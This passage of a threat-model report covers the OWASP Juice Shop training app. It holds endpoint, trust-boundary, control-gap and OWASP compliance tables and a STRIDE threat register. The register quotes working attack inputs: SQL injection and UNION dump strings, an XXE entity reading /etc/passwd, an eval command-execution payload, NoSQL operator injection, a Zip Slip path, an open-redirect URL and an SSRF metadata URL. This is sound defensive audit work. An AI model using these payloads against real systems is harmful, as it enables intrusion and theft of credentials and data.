| GET /rest/wallet/balance | HTTP GET | customer (JWT) | No owner check — IDOR | [T-017](#t-017) |
| PUT /rest/wallet/balance | HTTP PUT | customer (JWT) | No owner check — balance manipulation | [T-017](#t-017) |
| GET /rest/order-history | HTTP GET | customer (JWT) | No owner filter — all orders visible | [T-020](#t-020) |
| GET /rest/admin/application-configuration | HTTP GET | customer (JWT) | Returns full app config to any logged-in user | [T-021](#t-021) |
| POST /rest/chatbot/respond | HTTP POST | customer (JWT) | Chatbot process endpoint | [T-023](#t-023) |
| GET /rest/memories | HTTP GET | customer (JWT) | Memory images; IDOR on ownership | [T-020](#t-020) |
| POST /rest/memories | HTTP POST | customer (JWT) | Image upload; SSRF via URL parameter | [T-018](#t-018) |

---

## 6. Trust Boundaries

Trust boundaries mark transitions between different trust levels. Weaknesses at these boundaries are primary sources of security risk.

The overall trust model is fundamentally broken: the application's authentication system uses a hardcoded, publicly-known RSA private key, collapsing the browser↔server trust boundary entirely. Every other boundary depends on this authentication system holding.

| # | Boundary | From | To | Enforcement Mechanism | Key Weakness | Linked Threats |
|---|----------|------|----|-----------------------|--------------|----------------|
| B1 | Public Internet → Express API | Any client | Express port 3000 | None (no WAF, no gateway) | Direct exposure; no pre-filtering | [T-002](#t-002)–[T-006](#t-006) |
| B2 | Browser ↔ Express API (Auth) | Angular SPA | REST endpoints | JWT Bearer token (RS256) | Private key hardcoded in source | [T-001](#t-001), [T-007](#t-007) |
| B3 | Express API → SQLite | Route handlers | Sequelize ORM | Node.js process boundary only | Raw string interpolation bypasses ORM | [T-002](#t-002), [T-003](#t-003) |
| B4 | Express API → MarsDB | Route handlers | MarsDB collection | Node.js process boundary only | $where clause evaluates JS; no parameterization | [T-011](#t-011), [T-012](#t-012) |
| B5 | Browser ↔ Browser (XSS) | User content | DOM | Angular security model | bypassSecurityTrustHtml disables protection | [T-009](#t-009) |
| B6 | Express API → File System | Upload handler | /uploads, /ftp | sanitize-filename (partial) | Zip Slip bypasses path check; XXE reads any file | [T-004](#t-004), [T-008](#t-008) |
| B7 | Unauthenticated → Management | Any client | /metrics, /ftp, /logs | None | No authentication on management paths | [T-015](#t-015), [T-016](#t-016), [T-019](#t-019) |
| B8 | customer → admin | JWT customer role | Admin operations | JWT role claim check | No role-elevation checks; admin features partly exposed | [T-013](#t-013), [T-021](#t-021) |

**Prose notes on weakest boundaries:**

**B1 (Internet → API):** There is no ingress filtering whatsoever. Any payload — SQL injection strings, XML with external entities, ZIP bombs, JavaScript evaluation strings — reaches application code without inspection.

**B2 (Auth boundary):** JWT validation uses the correct public key, but the private key (`MIICXAIBAAKBgQDNwqL****`) is committed to [lib/insecurity.ts:27](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:27). This means the boundary provides no actual security — any attacker can sign arbitrary tokens offline.

**B7 (Management endpoints):** `/metrics`, `/ftp`, `/encryptionkeys`, `/support/logs`, and `/api-docs` are all accessible without any authentication. These expose Prometheus metrics (including user counts and wallet balances), application source files, encryption keys, and log files.

---

## 7. Identified Security Controls

**Gap summary:** The most critical control gaps are: (1) the authentication system is built on a hardcoded private key, making the entire JWT infrastructure meaningless; (2) all SQL queries use raw string interpolation, making the entire data layer vulnerable to injection; (3) there is no Content-Security-Policy header, meaning the browser has no XSS mitigation at the transport layer; (4) CORS is configured as a wildcard allowing all origins, removing cross-origin protection for all authenticated APIs; (5) passwords are stored as unsalted MD5 hashes, meaning any database breach results in immediate credential compromise for all users.

Legend: ✅ Adequate | ⚠️ Partial | 🔶 Weak | ❌ Missing

| Domain | Control | Implementation | Effectiveness | Linked Threats |
|--------|---------|----------------|---------------|----------------|
| IAM | JWT token verification | [lib/insecurity.ts:54](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:54) — expressJwt with RS256 public key | 🔶 Weak | [T-001](#t-001) — private key hardcoded |
| IAM | Password hashing | [models/user.ts:77](vscode://file/home/mrohr/juice-shop/models/user.ts:77) — MD5 (no bcrypt/argon2) | ❌ Missing | [T-010](#t-010) |
| IAM | Multi-factor authentication | Optional TOTP in 2fa.ts | ⚠️ Partial | [T-024](#t-024) |
| Authorization | Route-level auth middleware | [server.ts:355-445](vscode://file/home/mrohr/juice-shop/server.ts:355) — selective isAuthorized() | 🔶 Weak | [T-013](#t-013), [T-017](#t-017) |
| Authorization | Role-based access control | isAccounting() in server.ts for some routes | ⚠️ Partial | [T-021](#t-021) |
| Authorization | Resource ownership checks | appendUserId() — adds ID but does not verify ownership | ❌ Missing | [T-013](#t-013), [T-017](#t-017), [T-020](#t-020) |
| Data Protection | Data encryption at rest | No database encryption; SQLite file unencrypted | ❌ Missing | [T-003](#t-003) |
| Data Protection | TLS in transit | No TLS on server itself; relies on infrastructure | ⚠️ Partial | [T-026](#t-026) |
| Input Validation | SQL parameterization | [routes/search.ts:23](vscode://file/home/mrohr/juice-shop/routes/search.ts:23), [routes/login.ts:34](vscode://file/home/mrohr/juice-shop/routes/login.ts:34) — raw string interpolation | ❌ Missing | [T-002](#t-002), [T-003](#t-003) |
| Input Validation | XML entity handling | [routes/fileUpload.ts:83](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:83) — noent:true (XXE enabled) | ❌ Missing | [T-004](#t-004) |
| Input Validation | File upload validation | [routes/fileUpload.ts:67](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:67) — extension check only, no MIME enforcement | 🔶 Weak | [T-008](#t-008) |
| Input Validation | Output encoding (frontend) | [frontend/src/app/search-result/search-result.component.ts:170](vscode://file/home/mrohr/juice-shop/frontend/src/app/search-result/search-result.component.ts:170) — bypassSecurityTrustHtml | ❌ Missing | [T-009](#t-009) |
| Audit & Logging | Access logging | [server.ts:338](vscode://file/home/mrohr/juice-shop/server.ts:338) — morgan 'combined' to rotating file | ✅ Adequate | — (logs accessible at /support/logs — see T-019) |
| Audit & Logging | Security event logging | [lib/logger.ts](vscode://file/home/mrohr/juice-shop/lib/logger.ts) — Winston logger | ⚠️ Partial | [T-027](#t-027) |
| Audit & Logging | Log protection | [server.ts:281](vscode://file/home/mrohr/juice-shop/server.ts:281) — /support/logs unauthenticated | ❌ Missing | [T-019](#t-019) |
| Infrastructure | Container non-root | [Dockerfile:19](vscode://file/home/mrohr/juice-shop/Dockerfile:19) — USER 65532 on distroless image | ✅ Adequate | — |
| Infrastructure | Rate limiting | [server.ts:343](vscode://file/home/mrohr/juice-shop/server.ts:343) — only on /rest/user/reset-password | 🔶 Weak | [T-022](#t-022), [T-024](#t-024) |
| Infrastructure | HTTP security headers | [server.ts:185](vscode://file/home/mrohr/juice-shop/server.ts:185) — noSniff + frameguard only | 🔶 Weak | [T-009](#t-009) |
| Infrastructure | CORS policy | [server.ts:181](vscode://file/home/mrohr/juice-shop/server.ts:181) — cors() wildcard, all origins | ❌ Missing | [T-028](#t-028) |
| Infrastructure | Content-Security-Policy | No global CSP; only per-profile dynamic CSP | ❌ Missing | [T-009](#t-009) |
| Infrastructure | HSTS | Not configured | ❌ Missing | [T-026](#t-026) |
| Secret Management | RSA private key | [lib/insecurity.ts:27](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:27) — hardcoded in source | ❌ Missing | [T-001](#t-001) |
| Secret Management | HMAC secret | [lib/insecurity.ts:44](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:44) — hardcoded in source | ❌ Missing | [T-001](#t-001) |
| Dependency | SBOM generation | [package.json:62](vscode://file/home/mrohr/juice-shop/package.json:62) — CycloneDX npm | ✅ Adequate | — |
| Dependency | CVE scanning in CI | CodeQL in CI; no npm audit blocking step confirmed | ⚠️ Partial | [T-027](#t-027) |
| Dependency | Package lockfile | package-lock.json present and committed | ✅ Adequate | — |
| Dependency | Action pinning (CI) | [.github/workflows/ci.yml:26](vscode://file/home/mrohr/juice-shop/.github/workflows/ci.yml:26) — SHA-pinned | ✅ Adequate | — |
| Security Testing | SAST in CI | [.github/workflows/codeql-analysis.yml](vscode://file/home/mrohr/juice-shop/.github/workflows/codeql-analysis.yml) — CodeQL | ✅ Adequate | — |
| Security Testing | E2E security tests | Cypress e2e tests including some security scenarios | ⚠️ Partial | — |
| OAuth/OIDC | Google OAuth flow | [routes/login.ts:134](vscode://file/home/mrohr/juice-shop/frontend/src/app/login/login.component.ts:134) — implicit flow (deprecated) | 🔶 Weak | [T-028](#t-028) |
| SPA/BFF | Token storage | [login.component.ts:101](vscode://file/home/mrohr/juice-shop/frontend/src/app/login/login.component.ts:101) — localStorage | ❌ Missing | [T-007](#t-007), [T-009](#t-009) |

---

## 7b. Requirements Compliance

This section summarizes the compliance status of each requirement from the [OWASP Generic Security Baseline](https://cheatsheetseries.owasp.org) (cached — plugin fallback). Requirements marked ❌ FAIL or ❌ ANTI-PATTERN have generated threat entries in the [Threat Register](#8-threat-register).

### Architectural Violations

These findings represent **systemic architectural gaps** — missing patterns or standard services that have cascading security impact beyond individual controls.

| Violation | Priority | Evidence | Risk | Linked Threats |
|-----------|----------|----------|------|----------------|
| [WEB-002](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html) — Token in localStorage | MUST | [login.component.ts:101](vscode://file/home/mrohr/juice-shop/frontend/src/app/login/login.component.ts:101) — `localStorage.setItem('token', ...)` | 🟠 High | [T-007](#t-007) |
| [AC-004](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html) — No standard IdP/SSO | MUST | Custom JWT auth in lib/insecurity.ts; no OIDC/SAML provider integration | 🟠 High | [T-024](#t-024) |
| [DP-004](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) — MD5 password storage | MUST | [models/user.ts:77](vscode://file/home/mrohr/juice-shop/models/user.ts:77) — `security.hash(clearTextPassword)` = MD5 | 🔴 Critical | [T-010](#t-010) |

### Full Compliance Table

| Requirement | Priority | Title | Status | Evidence | Linked Threats |
|-------------|----------|-------|--------|----------|----------------|
| [DP-004](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) | MUST | Do not store passwords; use standard auth | ❌ ANTI-PATTERN | MD5 hashing in models/user.ts:77 | [T-010](#t-010) |
| [WEB-002](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html) | MUST | No sensitive data in localStorage | ❌ ANTI-PATTERN | JWT in localStorage at login.component.ts:101 | [T-007](#t-007) |
| [AC-004](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html) | MUST | Standard IdP with mandatory MFA | ❌ ANTI-PATTERN | Custom JWT auth; TOTP optional only | [T-024](#t-024) |
| [DP-005](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html) | MUST | Secrets in secret manager | ❌ FAIL | RSA private key hardcoded in lib/insecurity.ts:27 | [T-001](#t-001) |
| [IV-004](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) | MUST | Parameterized queries | ❌ FAIL | Raw SQL in routes/search.ts:23, routes/login.ts:34 | [T-002](#t-002), [T-003](#t-003) |
| [IV-002](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) | MUST | Harden XML parsers | ❌ FAIL | noent:true in routes/fileUpload.ts:83 | [T-004](#t-004) |
| [IV-001](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html) | MUST | Validate all input; reject unknown | ❌ FAIL | eval(code) in routes/userProfile.ts:62; vm.runInContext in routes/b2bOrder.ts:23 | [T-005](#t-005), [T-006](#t-006) |
| [WEB-001](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) | MUST | Anti-CSRF protection | ❌ FAIL | No SameSite cookie; no CSRF token; password change via GET | [T-029](#t-029) |
| [WEB-003](https://cheatsheetseries.owasp.org/cheatsheets/CORS_Security_Cheat_Sheet.html) | MUST | Restrictive CORS | ❌ FAIL | app.use(cors()) wildcard in server.ts:181 | [T-028](#t-028) |
| [WEB-005](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html) | MUST | HSTS header | ❌ FAIL | Not configured in server.ts | [T-026](#t-026) |
| [WEB-007](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) | MUST | Encode user-controlled output | ❌ FAIL | bypassSecurityTrustHtml in search-result.component.ts:132 | [T-009](#t-009) |
| [HN-002](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html) | MUST | Management endpoints not public | ❌ FAIL | /metrics, /ftp, /encryptionkeys, /support/logs unauthenticated | [T-015](#t-015), [T-016](#t-016) |
| [AC-002](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html) | MUST | Least-privilege RBAC; deny by default | ❌ FAIL | appendUserId() does not verify ownership; /api/Users exposes all users | [T-013](#t-013) |
| [AC-003](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html) | MUST | Rate limit all external endpoints | ❌ FAIL | Only /rest/user/reset-password rate-limited; login is not | [T-022](#t-022) |
| [AC-005](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html) | MUST | Validate token claims | ❌ FAIL | express-jwt 0.1.3 does not enforce algorithm allowlist | [T-001](#t-001) |
| [AC-006](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html) | MUST | Prevent IDOR | ❌ FAIL | Wallet, order-history, memories lack ownership checks | [T-017](#t-017), [T-020](#t-020) |
| [IV-005](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) | MUST | Secure file upload | ❌ FAIL | Zip Slip in fileUpload.ts:45; extension-only check | [T-008](#t-008) |
| [EH-001](https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html) | MUST | No internal details in errors | ❌ FAIL | XXE error leaks file contents; SQL errors passed to next() | [T-004](#t-004) |
| [DP-005](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html) | MUST | Secrets in secret manager | ❌ FAIL | Multiple hardcoded secrets in source code | [T-001](#t-001) |
| [LM-003](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html) | MUST | Centralized tamper-resistant logs | ❌ FAIL | Logs stored locally, accessible unauthenticated at /support/logs | [T-019](#t-019) |
| [IF-006](https://cheatsheetseries.owasp.org/cheatsheets/Infrastructure_as_Code_Security_Cheat_Sheet.html) | MUST | IaC policy-as-code scanning | ❌ FAIL | No tfsec/Checkov found in CI workflows | — |
| [SC-001](https://owasp.org/www-project-dependency-check/) | MUST | Blocking SCA in CI | ❌ FAIL | No npm audit --audit-level=high blocking step in ci.yml | — |
| [WEB-004](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) | SHOULD | Content-Security-Policy | ❌ FAIL | No global CSP header; profile CSP contains unsafe-eval | [T-009](#t-009) |
| [HN-001](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html) | MUST | Disable tech-disclosure headers | ✅ PASS | app.disable('x-powered-by') in server.ts:188 | — |
| [IF-002](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html) | MUST | Container non-root | ✅ PASS | USER 65532 in Dockerfile:19 on distroless image | — |
| [SC-004](https://owasp.org/www-project-cyclonedx/) | SHOULD | SBOM generation | ✅ PASS | npm run sbom via CycloneDX in package.json:62 | — |
| [SC-006](https://owasp.org/www-community/controls/Static_Code_Analysis) | MUST | SAST in CI | ✅ PASS | CodeQL in .github/workflows/codeql-analysis.yml | — |
| [SC-002](https://owasp.org/www-project-dependency-check/) | MUST | Lockfile pinning | ✅ PASS | package-lock.json present and committed | — |
| [LM-001](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html) | MUST | Log security events | ⚠️ PARTIAL | Morgan access logging present; security events not structured | [T-027](#t-027) |
| [EH-002](https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html) | MUST | Generic error messages | ⚠️ PARTIAL | Some generic messages; SQL errors forwarded raw | — |
| [IV-006](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html) | MUST | Payload size limits | ⚠️ PARTIAL | checkUploadSize for files; no JSON depth limit | [T-022](#t-022) |
| [AC-001](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html) | MUST | Mutual auth for API-to-API | ⚠️ PARTIAL | JWT on B2B endpoint; no mTLS | — |

**Summary:** 32 requirements checked — ✅ 5 PASS · ❌ 23 FAIL · ❌ 3 ANTI-PATTERN · ⚠️ 4 PARTIAL

---

## 8. Threat Register

The threat register lists every confirmed STRIDE finding with its evidence, current state, and the mitigation that addresses it. Threats are split into four sub-sections by severity so the reader can see at a glance what is critical and what is hardening work.

**Risk methodology:** Risk = Likelihood × Impact. Likelihood considers exploitability, attack complexity, and required privileges. Impact considers confidentiality, integrity, and availability effects on the identified assets. Ratings: Critical, High, Medium, Low.

**Risk Distribution:** Critical: 6 · High: 9 · Medium: 8 · Low: 5 · **Total: 28**
**STRIDE Coverage:** Spoofing: 5 · Tampering: 6 · Repudiation: 2 · Information Disclosure: 8 · Denial of Service: 3 · Elevation of Privilege: 4

### 8.1 Critical (6)

These findings combine high exploitability with maximum impact. Every entry here also appears in Section 9 (Critical Findings) and is the source of the P1 rollout actions in the Management Summary.

| ID | Component | STRIDE | Threat Scenario | Likelihood | Impact | Risk | Controls in Place | Mitigations |
|----|-----------|--------|-----------------|------------|--------|------|-------------------|-------------|
| <a id="t-001"></a>[T-001](#t-001) | Auth Service | Spoofing | The RSA private key used to sign all JWTs is hardcoded in source code at [lib/insecurity.ts:27](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:27). Any actor with repository read access (public repo) can sign arbitrary JWT payloads — including `{"data":{"id":1,"email":"admin@juice-sh.op","role":"admin"}}` — and authenticate as any user including admin without credentials. (CWE-321) Violated: [DP-005](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html), [AC-005](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html) | 🔴 Critical | 🔴 Critical | 🔴 Critical | RS256 verification against public key (valid mechanism if key is secret) | [M-001](#m-001) |
| <a id="t-002"></a>[T-002](#t-002) | Auth Service | Spoofing | The login query at [routes/login.ts:34](vscode://file/home/mrohr/juice-shop/routes/login.ts:34) concatenates `req.body.email` directly into SQL: `` SELECT * FROM Users WHERE email='${email}' AND password='...' ``. An unauthenticated attacker submitting `' OR 1=1--` as the email logs in as the first database user (admin) without any password. (CWE-89) Violated: [IV-004](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) | 🔴 Critical | 🔴 Critical | 🔴 Critical | None — raw string interpolation, no escaping | [M-002](#m-002) |
| <a id="t-003"></a>[T-003](#t-003) | Express API | Information Disclosure | The product search at [routes/search.ts:23](vscode://file/home/mrohr/juice-shop/routes/search.ts:23) concatenates `req.query.q` into SQL: `` SELECT * FROM Products WHERE name LIKE '%${criteria}%' ``. An unauthenticated attacker can inject `' UNION SELECT id,email,password,role,NULL,NULL,NULL,NULL,NULL FROM Users--` to extract all user credentials including MD5-hashed passwords. (CWE-89) Violated: [IV-004](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) | 🔴 Critical | 🔴 Critical | 🔴 Critical | 200-character length limit on criteria (trivially sufficient for UNION) | [M-002](#m-002) |
| <a id="t-004"></a>[T-004](#t-004) | File Upload | Information Disclosure | The XML upload handler at [routes/fileUpload.ts:83](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:83) calls `libxml.parseXml(data, { noent: true, nocdata: true })`. An unauthenticated attacker uploads an XML file containing `<!ENTITY xxe SYSTEM "file:///etc/passwd">` and the file content is resolved and returned in the 410 error response body. (CWE-611) Violated: [IV-002](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html), [EH-001](https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html) | 🔴 Critical | 🟠 High | 🔴 Critical | libxmljs2 timeout of 2000ms limits XXE DoS; file type not restricted | [M-003](#m-003) |
| <a id="t-005"></a>[T-005](#t-005) | Express API | Elevation of Privilege | The user profile route at [routes/userProfile.ts:62](vscode://file/home/mrohr/juice-shop/routes/userProfile.ts:62) evaluates the username field using `eval(code)` when the username matches `#{...}`. An authenticated attacker sets their username to `#{process.mainModule.require('child_process').execSync('id').toString()}` to execute arbitrary OS commands on the server. (CWE-95) Violated: [IV-001](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html) | 🟠 High | 🔴 Critical | 🔴 Critical | Requires authentication; regex match limits trigger pattern | [M-004](#m-004) |
| <a id="t-006"></a>[T-006](#t-006) | Express API | Elevation of Privilege | The B2B order endpoint at [routes/b2bOrder.ts:23](vscode://file/home/mrohr/juice-shop/routes/b2bOrder.ts:23) passes `body.orderLinesData` to `safeEval(orderLinesData)` inside a Node.js `vm` context. The `notevil` library has known sandbox escape paths via prototype pollution; an authenticated B2B customer can achieve remote code execution on the server. (CWE-94) Violated: [IV-001](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html) | 🟠 High | 🔴 Critical | 🔴 Critical | Requires JWT auth; notevil provides partial sandbox; 2s timeout | [M-004](#m-004) |

### 8.2 High (9)

High-rated threats require remediation in the current sprint or quarter. They typically gate the next release.

| ID | Component | STRIDE | Threat Scenario | Likelihood | Impact | Risk | Controls in Place | Mitigations |
|----|-----------|--------|-----------------|------------|--------|------|-------------------|-------------|
| <a id="t-007"></a>[T-007](#t-007) | Angular SPA | Information Disclosure | JWT authentication tokens are stored in `localStorage` ([login.component.ts:101](vscode://file/home/mrohr/juice-shop/frontend/src/app/login/login.component.ts:101)). Any JavaScript executing in the same origin — via XSS, a malicious browser extension, or a compromised third-party script — can read `localStorage.getItem('token')` and exfiltrate the token, enabling persistent session hijacking without re-authentication. (CWE-922) Violated: [WEB-002](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html) | 🟠 High | 🟠 High | 🟠 High | 6-hour JWT expiry limits window; token also set in cookie | [M-006](#m-006) |
| <a id="t-008"></a>[T-008](#t-008) | File Upload | Tampering | The ZIP file handler at [routes/fileUpload.ts:40-45](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:40) extracts ZIP entries using `entry.path` without fully resolving the path: `entry.pipe(fs.createWriteStream('uploads/complaints/' + fileName))`. A ZIP containing an entry with path `../../../ftp/legal.md` writes attacker-controlled content outside the uploads directory. (CWE-22) Violated: [IV-005](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) | 🟠 High | 🟠 High | 🟠 High | `absolutePath.includes(path.resolve('.'))` check present but bypassable | [M-009](#m-009) |
| <a id="t-009"></a>[T-009](#t-009) | Angular SPA | Tampering | Angular's `DomSanitizer.bypassSecurityTrustHtml()` is called at [search-result.component.ts:132](vscode://file/home/mrohr/juice-shop/frontend/src/app/search-result/search-result.component.ts:132) and line 170, disabling Angular's built-in XSS protection. Combined with product descriptions rendered via `[innerHTML]` in `product-details.component.html:16`, stored XSS payloads in product data execute in victim browsers. (CWE-79) Violated: [WEB-007](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html), [WEB-004](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) | 🟠 High | 🟠 High | 🟠 High | sanitize-html 1.4.2 used in some paths (outdated, bypassable) | [M-010](#m-010), [M-008](#m-008) |
| <a id="t-010"></a>[T-010](#t-010) | Auth Service | Information Disclosure | Passwords are hashed using MD5 in [models/user.ts:77](vscode://file/home/mrohr/juice-shop/models/user.ts:77) via `security.hash(clearTextPassword)` which calls `crypto.createHash('md5')`. MD5 is not a password hashing function — it produces 32-character hex digests in microseconds, enabling offline dictionary and rainbow-table attacks on any obtained hash dump. No salt is applied. (CWE-916) Violated: [DP-004](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) | 🟠 High | 🟠 High | 🟠 High | None — raw MD5, no salt | [M-005](#m-005) |
| <a id="t-011"></a>[T-011](#t-011) | Product Reviews | Tampering | The reviews endpoint at [routes/showProductReviews.ts:36](vscode://file/home/mrohr/juice-shop/routes/showProductReviews.ts:36) uses `db.reviewsCollection.find({ $where: 'this.product == ' + id })`. An unauthenticated attacker injects `0; sleep(2000)` as the product ID to trigger a NoSQL DoS, or injects JavaScript to exfiltrate all reviews. (CWE-943) | 🟠 High | 🟠 High | 🟠 High | Truncation to 40 chars when challenge enabled; global sleep() capped at 2s | [M-011](#m-011) |
| <a id="t-012"></a>[T-012](#t-012) | Product Reviews | Tampering | The review update endpoint at [routes/updateProductReviews.ts:18](vscode://file/home/mrohr/juice-shop/routes/updateProductReviews.ts:18) uses `{ _id: req.body.id }` as the MarsDB filter with `{ multi: true }`. An authenticated user can pass a MongoDB operator as `id` (e.g. `{"$gt":""}`) to update all reviews simultaneously, or pass another user's review ID to tamper with their content. (CWE-943) | 🟠 High | 🟠 High | 🟠 High | Requires authentication; no IDOR check on review ownership | [M-011](#m-011) |
| <a id="t-013"></a>[T-013](#t-013) | Express API | Information Disclosure | The `/api/Users` endpoint (GET) at [server.ts:362](vscode://file/home/mrohr/juice-shop/server.ts:362) requires only `security.isAuthorized()` — any authenticated user can retrieve the full user list including emails and hashed passwords. The `/api/Users/:id` endpoint allows any authenticated user to read any user record by ID, enabling enumeration of all accounts. (CWE-285) Violated: [AC-002](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html), [AC-006](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html) | 🟠 High | 🟠 High | 🟠 High | Requires authentication; no further RBAC | [M-012](#m-012) |
| <a id="t-014"></a>[T-014](#t-014) | Express API | Spoofing | The redirect handler at [routes/redirect.ts](vscode://file/home/mrohr/juice-shop/routes/redirect.ts) uses `url.includes(allowedUrl)` in [lib/insecurity.ts:137](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:137). An attacker constructs a URL like `https://evil.com?ref=https://github.com/juice-shop/juice-shop` which passes the allowlist check (includes the trusted URL as a query parameter) and redirects victims to a phishing site. (CWE-601) | 🟠 High | 🟠 High | 🟠 High | Allowlist present but bypassed via substring match | [M-013](#m-013) |
| <a id="t-015"></a>[T-015](#t-015) | Express API | Information Disclosure | The Prometheus metrics endpoint at [server.ts:718](vscode://file/home/mrohr/juice-shop/server.ts:718) (`GET /metrics`) requires no authentication. An unauthenticated attacker can enumerate total user count, wallet balance totals, order counts, challenge solve rates, and server startup duration — providing reconnaissance data for targeted attacks. (CWE-200) Violated: [HN-002](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html) | 🟠 High | 🟡 Medium | 🟠 High | None — prom-client serves all metrics openly | [M-014](#m-014) |

### 8.3 Medium (8)

Medium-rated threats represent meaningful gaps with either reduced exploitability or contained impact. They should be tracked and remediated as part of normal hardening work.

| ID | Component | STRIDE | Threat Scenario | Likelihood | Impact | Risk | Controls in Place | Mitigations |
|----|-----------|--------|-----------------|------------|--------|------|-------------------|-------------|
| <a id="t-016"></a>[T-016](#t-016) | Express API | Information Disclosure | The FTP directory at `/ftp` is browsable via serve-index ([server.ts:269](vscode://file/home/mrohr/juice-shop/server.ts:269)) without authentication, exposing files including `acquisitions.md`, `incident-support.kdbx`, `coupons_2013.md.bak`, and `package-lock.json.bak`. The `/encryptionkeys` directory similarly exposes RSA public keys and CTF keys. (CWE-548) Violated: [HN-002](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html) | 🟠 High | 🟡 Medium | 🟡 Medium | robots.txt disallows /ftp (trivially bypassed) | [M-014](#m-014) |
| <a id="t-017"></a>[T-017](#t-017) | Express API | Elevation of Privilege | The wallet balance endpoints at [server.ts:624-625](vscode://file/home/mrohr/juice-shop/server.ts:624) use `security.appendUserId()` which appends the user ID from the JWT but does not verify the requested wallet ID matches the authenticated user. An authenticated attacker can read or modify another user's wallet balance by guessing or enumerating wallet IDs. (CWE-639) Violated: [AC-006](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html) | 🟡 Medium | 🟠 High | 🟡 Medium | Requires authentication | [M-012](#m-012) |
| <a id="t-018"></a>[T-018](#t-018) | Express API | Information Disclosure | The profile image URL upload at [routes/profileImageUrlUpload.ts](vscode://file/home/mrohr/juice-shop/routes/profileImageUrlUpload.ts) fetches a user-supplied URL server-side. An authenticated attacker supplies an internal URL (e.g. `http://169.254.169.254/latest/meta-data/`) to probe internal services or cloud metadata endpoints, enabling SSRF. (CWE-918) | 🟡 Medium | 🟠 High | 🟡 Medium | Requires authentication | [M-015](#m-015) |
